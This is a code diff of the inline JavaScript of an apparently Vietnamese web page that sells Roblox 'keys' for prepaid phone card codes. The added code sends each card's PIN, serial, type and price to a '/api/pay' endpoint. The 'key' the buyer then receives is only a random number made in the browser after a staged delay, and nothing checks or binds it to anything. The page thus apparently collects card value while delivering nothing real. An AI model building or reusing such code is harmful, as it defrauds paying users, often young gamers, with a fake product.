@@ -110,70 +110,95 @@
     </div>
 
     <script>
-        function openPayment(plan, price) {
-            document.getElementById('dashboard-view').classList.add('hidden-view');
-            document.getElementById('payment-view').classList.remove('hidden-view');
-            document.getElementById('selected-plan').innerText = plan;
-            document.getElementById('selected-price').innerText = price;
-            document.getElementById('card-pin').value = '';
-            document.getElementById('card-seri').value = '';
-        }
+        // Hàm mở form thanh toán
+function openPayment(plan, price) {
+    document.getElementById('dashboard-view').classList.add('hidden-view');
+    document.getElementById('payment-view').classList.remove('hidden-view');
+    document.getElementById('selected-plan').innerText = plan;
+    document.getElementById('selected-price').innerText = price;
+}
 
-        function closePayment() {
-            document.getElementById('payment-view').classList.add('hidden-view');
-            document.getElementById('dashboard-view').classList.remove('hidden-view');
-        }
+// Hàm quay lại
+function closePayment() {
+    document.getElementById('payment-view').classList.add('hidden-view');
+    document.getElementById('dashboard-view').classList.remove('hidden-view');
+}
 
-        function submitPayment() {
-            const pin = document.getElementById('card-pin').value;
-            const seri = document.getElementById('card-seri').value;
-            
-            if(pin.length < 5 || seri.length < 5) {
-                alert("Vui lòng nhập đầy đủ mã thẻ và số seri sưng bro!");
-                return;
-            }
+// HÀM QUAN TRỌNG: Gửi thẻ sang API để check
+async function submitPayment() {
+    const loaiThe = document.querySelector('select').value;
+    const pin = document.getElementById('card-pin').value;
+    const seri = document.getElementById('card-seri').value;
+    const giaText = document.getElementById('selected-price').innerText;
+    
+    // Chuyển "10.000đ" thành số 10000 để API TheSieuRe hiểu
+    const gia = giaText.replace(/\D/g, "");
 
+    if (pin.length < 5 || seri.length < 5) {
+        return alert("Vui lòng nhập đầy đủ mã thẻ và seri sưng bro!");
+    }
+
+    const btn = document.querySelector('button[onclick="submitPayment()"]');
+    const originalText = btn.innerText;
+    btn.innerText = "ĐANG CHECK THẺ...";
+    btn.disabled = true;
+
+    try {
+        const response = await fetch('/api/pay', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ loaiThe, pin, seri, gia })
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+            // Nếu gửi thẻ thành công, chuyển sang bước nhập tên Nick
+            alert(data.msg);
             document.getElementById('payment-view').classList.add('hidden-view');
             document.getElementById('nickname-view').classList.remove('hidden-view');
-            document.getElementById('roblox-nick').value = '';
+        } else {
+            alert("Lỗi: " + data.msg);
         }
+    } catch (error) {
+        alert("Lỗi kết nối máy chủ, thử lại sau sưng bro!");
+    } finally {
+        btn.innerText = originalText;
+        btn.disabled = false;
+    }
+}
 
-        function generateKey() {
-            const nick = document.getElementById('roblox-nick').value;
-            if(nick.length < 3) {
-                alert("Tên nick Roblox phải dài hơn 3 ký tự sưng bro!");
-                return;
-            }
+// Hàm tạo Key sau khi nhập nick
+function generateKey() {
+    const nick = document.getElementById('roblox-nick').value;
+    if (nick.length < 3) return alert("Nhập nick chuẩn vào sưng bro!");
 
-            const btn = document.getElementById('btn-gen-key');
-            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Đang tạo Key...';
-            btn.disabled = true;
+    const btn = document.getElementById('btn-gen-key');
+    btn.innerText = "ĐANG TẠO KEY...";
+    btn.disabled = true;
 
-            setTimeout(() => {
-                const randomStr = Math.floor(Math.random() * 900000) + 100000;
-                const finalKey = "KEY_perm_" + randomStr;
+    setTimeout(() => {
+        const randomStr = Math.floor(Math.random() * 900000) + 100000;
+        const finalKey = "KEY_perm_" + randomStr;
 
-                document.getElementById('nickname-view').classList.add('hidden-view');
-                document.getElementById('key-result-view').classList.remove('hidden-view');
-                
-                document.getElementById('display-nick').innerText = nick;
-                document.getElementById('generated-key').innerText = finalKey;
+        document.getElementById('nickname-view').classList.add('hidden-view');
+        document.getElementById('key-result-view').classList.remove('hidden-view');
+        
+        document.getElementById('display-nick').innerText = nick;
+        document.getElementById('generated-key').innerText = finalKey;
+    }, 2000);
+}
 
-                btn.innerText = "CHẤP NHẬN";
-                btn.disabled = false;
-            }, 2000);
-        }
+// Hàm copy key
+function copyKey() {
+    const keyText = document.getElementById('generated-key').innerText;
+    navigator.clipboard.writeText(keyText);
+    alert("Đã copy Key!");
+}
 
-        function copyKey() {
-            const keyText = document.getElementById('generated-key').innerText;
-            navigator.clipboard.writeText(keyText);
-            alert("Đã copy Key thành công sưng bro!");
-        }
-
-        function backToHome() {
-            document.getElementById('key-result-view').classList.add('hidden-view');
-            document.getElementById('dashboard-view').classList.remove('hidden-view');
-        }
+function backToHome() {
+    location.reload();
+}
     </script>
 </body>
 </html>
